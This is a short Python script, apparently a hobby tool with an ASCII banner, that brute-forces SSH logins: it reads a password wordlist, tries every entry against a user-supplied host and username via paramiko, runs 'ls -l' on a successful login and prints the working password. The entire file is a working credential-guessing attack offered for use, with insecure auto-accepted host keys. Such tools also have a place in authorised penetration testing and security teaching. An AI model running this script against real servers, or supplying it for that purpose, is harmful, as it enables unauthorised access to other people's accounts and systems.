import paramiko

def print_banner():
    banner = r"""
              .__                   __        
  ______ _____|  |__               |__|______ 
 /  ___//  ___/  |  \   ______     |  \_  __ \
 \___ \ \___ \|   Y  \ /_____/     |  ||  | \/
/____  >____  >___|  /         /\__|  ||__|   
     \/     \/     \/          \______|       
"""
    print(banner)

def inputInfo():
    global hostname, username
    hostname = input("Enter hostname or IP: ")
    username = input("Enter username: ")
    wordlistPath = input("Enter path to wordlist file: ")
    with open(wordlistPath , "r", encoding="utf-8", errors="ignore") as wordListFile:
        words = [line.strip() for line in wordListFile]
    return words

def connection(words):
    length = len(words)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    i = 0
    while True:
        if i >= length:
            print("Looped through wordlist")
            break
        try:
            password = words[i]
            client.connect(hostname, username=username, password=password)
            stdin, stdout, stderr = client.exec_command('ls -l')
            output = stdout.read().decode('utf-8')
            error = stderr.read().decode('utf-8')
            if output:
                print("Command Output:")
                print(output)
                print(f"Successful Login: {password}")
            if error:
                print("Command Error:")
                print(error)
        except paramiko.AuthenticationException:
            print("Authentication failed.")
        except paramiko.SSHException as e:
            print(f"SSH connection error: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
        finally:
            client.close()
        i += 1

def start():
    print_banner()
    words = inputInfo()
    connection(words)

if __name__ == "__main__":
    start()